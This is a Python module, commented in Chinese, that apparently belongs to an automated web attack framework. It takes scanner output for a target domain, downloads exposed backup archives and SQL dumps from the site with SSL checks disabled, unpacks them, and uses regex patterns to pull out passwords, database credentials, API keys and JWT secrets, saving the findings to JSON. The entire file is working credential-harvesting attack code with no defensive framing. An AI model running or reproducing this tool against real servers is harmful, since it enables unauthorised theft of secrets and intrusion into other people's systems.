#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
backup_leak.py - 备份文件利用工具模块
由调度系统调用，下载 .zip/.tar.gz/.sql 等备份文件，解包提取敏感信息
依赖: requests
"""

import os
import json
import re
import io
import zipfile
import tarfile
import datetime
import requests

from tools import RESULTS_BASE

# ==================== 工具接口变量 ====================
TOOL_NAME = "备份文件利用"
TOOL_ID = "backup_leak"
TOOL_DESC = "下载 .zip/.tar.gz/.sql 等备份文件，解包提取敏感信息"
TOOL_CATEGORY = "info_leak"

# ==================== 配置区 ====================
TIMEOUT = 10
MAX_DOWNLOAD_SIZE = 100 * 1024 * 1024  # 100MB
VERIFY_SSL = False

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
}

# ==================== 颜色与日志 ====================
class Colors:
    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; CYAN = '\033[96m'; BOLD = '\033[1m'; RESET = '\033[0m'

class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)

logger = Logger()

# ==================== 备份文件扩展名 ====================
BACKUP_EXTENSIONS = (".zip", ".tar.gz", ".tgz", ".sql", ".bak", ".rar", ".tar.bz2")

# ==================== 敏感文件名匹配关键词 ====================
SENSITIVE_FILE_KEYWORDS = [
    ".env", "config", "secret", "credential", "password",
    "database", ".yml", ".yaml", ".json", ".conf", ".ini",
    ".properties", "web.config", "settings", "key", "token",
]

# ==================== SQL 凭据匹配正则 ====================
SQL_CREDENTIAL_PATTERNS = [
    re.compile(r"(?:CREATE\s+USER\s+|GRANT\s+.*\s+TO\s+|IDENTIFIED\s+BY\s+)['\"]([^'\"]+)['\"]", re.I),
    re.compile(r"(?:password|passwd|AUTH_STRING)\s*[=:)]\s*['\"]([^'\"]+)['\"]", re.I),
    re.compile(r"(?:SET\s+PASSWORD\s+FOR\s+.*?=\s*)['\"]([^'\"]+)['\"]", re.I),
    re.compile(r"(?:ALTER\s+USER\s+.*?IDENTIFIED\s+BY\s+)['\"]([^'\"]+)['\"]", re.I),
    re.compile(r"(?:INSERT\s+INTO\s+\w*user\w*.*?VALUES\s*\([^)]*?['\"]([^'\"]+)['\"])", re.I),
    re.compile(r"(?:DB_USERNAME|DB_PASSWORD|DB_HOST|DB_NAME|DATABASE_URL)\s*[=:]\s*['\"]([^'\"]+)['\"]", re.I),
    re.compile(r"(?:SECRET_KEY|API_KEY|ACCESS_KEY|AUTH_TOKEN|JWT_SECRET)\s*[=:]\s*['\"]([^'\"]+)['\"]", re.I),
    re.compile(r"\b(USER|ADMIN)\s*['\"]([^'\"]+)['\"]\s*['\"]([^'\"]+)['\"]", re.I),
]


# ==================== 通用下载器 ====================
def safe_download(url, stream=False, max_size=MAX_DOWNLOAD_SIZE):
    """带限速和异常处理的通用下载，防止内存炸弹"""
    try:
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT,
                           verify=VERIFY_SSL, stream=stream, allow_redirects=True)
        if resp.status_code != 200:
            return None
        if stream:
            chunks = []
            total = 0
            for chunk in resp.iter_content(chunk_size=8192):
                total += len(chunk)
                if total > max_size:
                    logger.warning(f"文件过大 (>100MB)，截断: {url}")
                    break
                chunks.append(chunk)
            return b"".join(chunks)
        else:
            if len(resp.content) > max_size:
                logger.warning(f"响应过大 (>100MB)，截断: {url}")
                return resp.content[:max_size]
            return resp.content
    except Exception as e:
        logger.warning(f"下载失败: {url} -> {e}")
        return None


# ==================== 缓存目录 ====================
def _get_cache_dir():
    """返回项目根目录下的 cache/ 目录"""
    cache_dir = os.path.join(os.path.dirname(__file__), '..', 'cache')
    os.makedirs(cache_dir, exist_ok=True)
    return cache_dir


# ==================== 备份文件提取逻辑 ====================
def _extract_sql_credentials(content):
    """从 SQL 文件内容中搜索凭据"""
    text = content.decode("utf-8", errors="ignore")[:500000]
    credentials = []
    for pat in SQL_CREDENTIAL_PATTERNS:
        for match in pat.finditer(text):
            groups = match.groups()
            for g in groups:
                if g and len(g) > 1 and len(g) < 128:
                    credentials.append(g)
    return list(set(credentials))[:20]


def _extract_zip_sensitive(zip_content, fname):
    """解压 ZIP 文件，列出内容并搜索敏感文件"""
    extracted = {"files": [], "credentials_found": [], "sensitive_files": []}
    try:
        with zipfile.ZipFile(io.BytesIO(zip_content)) as zf:
            extracted["files"] = zf.namelist()[:100]
            for f in extracted["files"][:80]:
                fl = f.lower()
                if any(k in fl for k in SENSITIVE_FILE_KEYWORDS):
                    extracted["sensitive_files"].append(f)
                    try:
                        inner_content = zf.read(f)
                        inner_text = inner_content.decode("utf-8", errors="ignore")[:10000]
                        preview = inner_text[:500]
                        extracted["credentials_found"].append({
                            "file": f,
                            "size": len(inner_content),
                            "preview": preview
                        })
                    except Exception:
                        pass
        logger.success(f"ZIP 解压成功: {fname} ({len(extracted['files'])} 个文件, {len(extracted['sensitive_files'])} 个敏感文件)")
    except Exception as e:
        logger.warning(f"ZIP 解压失败: {fname} -> {e}")
        extracted["extract_error"] = str(e)
    return extracted


def _extract_targz_info(targz_content, fname):
    """解压 TAR.GZ 文件，列出内容并搜索敏感文件"""
    extracted = {"files": [], "credentials_found": [], "sensitive_files": []}
    try:
        with tarfile.open(fileobj=io.BytesIO(targz_content), mode="r:gz") as tf:
            members = tf.getmembers()[:100]
            extracted["files"] = [m.name for m in members]
            for m in members[:80]:
                fl = m.name.lower()
                if m.isfile() and any(k in fl for k in SENSITIVE_FILE_KEYWORDS):
                    extracted["sensitive_files"].append(m.name)
                    try:
                        f = tf.extractfile(m)
                        if f:
                            inner_content = f.read()
                            inner_text = inner_content.decode("utf-8", errors="ignore")[:10000]
                            preview = inner_text[:500]
                            extracted["credentials_found"].append({
                                "file": m.name,
                                "size": len(inner_content),
                                "preview": preview
                            })
                    except Exception:
                        pass
        logger.success(f"TAR.GZ 解压成功: {fname} ({len(extracted['files'])} 个文件, {len(extracted['sensitive_files'])} 个敏感文件)")
    except Exception as e:
        logger.warning(f"TAR.GZ 解压失败: {fname} -> {e}")
        extracted["extract_error"] = str(e)
    return extracted


def _process_bak_file(content, fname):
    """处理 .bak / .rar 等不可直接解压的文件，尝试搜索嵌入文本凭据"""
    extracted = {"files": [fname], "credentials_found": [], "sensitive_files": []}
    text = content.decode("utf-8", errors="ignore")[:200000]
    found = []
    for pat in SQL_CREDENTIAL_PATTERNS:
        for match in pat.finditer(text):
            groups = match.groups()
            for g in groups:
                if g and len(g) > 1 and len(g) < 128:
                    found.append(g)
    if found:
        extracted["credentials_found"] = [{"pattern_match": v} for v in list(set(found))[:10]]
        logger.success(f"发现 {len(extracted['credentials_found'])} 条疑似凭据: {fname}")
    return extracted


def _process_backup_file(url, fname, content):
    """根据文件扩展名分发处理逻辑"""
    fname_lower = fname.lower()

    extracted = {"files": [], "credentials_found": [], "sensitive_files": []}

    if fname_lower.endswith(".sql"):
        creds = _extract_sql_credentials(content)
        if creds:
            extracted["credentials_found"] = creds
            extracted["sensitive_files"] = [fname]
            logger.success(f"SQL 文件发现 {len(creds)} 条疑似凭据: {fname}")
        else:
            logger.info(f"SQL 文件未发现凭据: {fname}")

    elif fname_lower.endswith(".zip"):
        extracted = _extract_zip_sensitive(content, fname)

    elif fname_lower.endswith((".tar.gz", ".tgz")):
        extracted = _extract_targz_info(content, fname)

    elif fname_lower.endswith((".bak", ".rar")):
        extracted = _process_bak_file(content, fname)

    else:
        extracted["files"] = [fname]

    return extracted


# ==================== 工具入口 ====================
def execute(scan_result, target_info):
    """
    执行备份文件利用。

    Args:
        scan_result: dict, saomiao.py 输出的扫描结果（已解析为 dict）
        target_info: dict, 包含 domain, ip, base_url

    Returns:
        dict: 标准化结果
    """
    domain = target_info.get("domain", "")

    processed_files = []
    errors = []

    # 1. 提取备份文件目标
    backup_targets = []
    seen_paths = set()
    for d in scan_result.get("directories", []):
        if d.get("status") != 200:
            continue
        path = d["path"]
        if path in seen_paths:
            continue
        # 检查扩展名
        is_backup = False
        for ext in BACKUP_EXTENSIONS:
            if path.endswith(ext):
                is_backup = True
                break
        if not is_backup:
            continue
        seen_paths.add(path)
        backup_targets.append(d)

    for issue in scan_result.get("security_issues", []):
        p = issue.get("path", "")
        itype = issue.get("type", "")
        if "备份文件" in itype:
            if not any(e.get("path") == p for e in backup_targets):
                backup_targets.append({
                    "path": p,
                    "status": 200,
                    "source": "security_issue",
                    "severity": issue.get("severity", "")
                })

    logger.info(f"从扫描结果提取到 {len(backup_targets)} 个备份文件目标")

    if not backup_targets:
        return {
            "tool": "backup_leak",
            "target": domain,
            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "failed",
            "summary": "未发现备份文件目标",
            "results": [],
            "errors": []
        }

    # 2. 下载并处理每个备份文件
    cache_dir = _get_cache_dir()
    total_credentials = 0
    total_sensitive_files = 0

    for target in backup_targets:
        url = target["path"]
        fname = url.split("/")[-1].split("?")[0]
        logger.info(f"下载备份文件: {url}")

        try:
            content = safe_download(url, stream=True)
            if not content:
                errors.append(f"下载失败: {url}")
                processed_files.append({
                    "path": url,
                    "filename": fname,
                    "status": "download_failed",
                    "size_mb": 0,
                    "extracted": {}
                })
                continue

            size_mb = round(len(content) / (1024 * 1024), 2)
            logger.info(f"下载完成: {fname} ({size_mb:.2f} MB)")

            # 保存到缓存目录
            local_path = os.path.join(cache_dir, fname)
            with open(local_path, 'wb') as f:
                f.write(content)

            # 分发处理
            extracted = _process_backup_file(url, fname, content)

            credential_count = len(extracted.get("credentials_found", []))
            sensitive_count = len(extracted.get("sensitive_files", []))
            total_credentials += credential_count
            total_sensitive_files += sensitive_count

            processed_files.append({
                "path": url,
                "filename": fname,
                "local_path": local_path,
                "size_mb": size_mb,
                "status": "processed",
                "extracted": extracted
            })

        except Exception as e:
            err_msg = f"处理 {url} 时出错: {str(e)}"
            errors.append(err_msg)
            logger.error(err_msg)
            processed_files.append({
                "path": url,
                "filename": fname,
                "status": "error",
                "error": str(e),
                "extracted": {}
            })

    # 3. 确定最终状态
    success_count = sum(1 for f in processed_files if f["status"] == "processed")
    failed_count = sum(1 for f in processed_files if f["status"] != "processed")

    if success_count == 0:
        status = "failed"
        summary = f"处理失败，{len(errors)} 个错误"
    elif failed_count > 0:
        status = "partial"
        summary = f"处理 {success_count}/{len(processed_files)} 个备份文件，{total_credentials} 条凭据，{total_sensitive_files} 个敏感文件（{len(errors)} 个错误）"
    else:
        status = "success"
        summary = f"处理 {success_count} 个备份文件，{total_credentials} 条凭据，{total_sensitive_files} 个敏感文件"

    # 4. 保存结果到文件
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result_dir = os.path.join(RESULTS_BASE, "backup_leak")
    os.makedirs(result_dir, exist_ok=True)
    result_file = os.path.join(result_dir, f"backup_leak_{domain}_{ts}.json")

    result_data = {
        "scan_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target_info,
        "total_backup_targets": len(backup_targets),
        "success_count": success_count,
        "failed_count": failed_count,
        "total_credentials": total_credentials,
        "total_sensitive_files": total_sensitive_files,
        "processed_files": processed_files,
        "errors": errors
    }

    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump(result_data, f, ensure_ascii=False, indent=2)

    logger.raw("\n" + "=" * 60)
    logger.info(f"结果已保存至: {result_file}")

    return {
        "tool": "backup_leak",
        "target": domain,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": status,
        "summary": summary,
        "results": processed_files,
        "errors": errors
    }
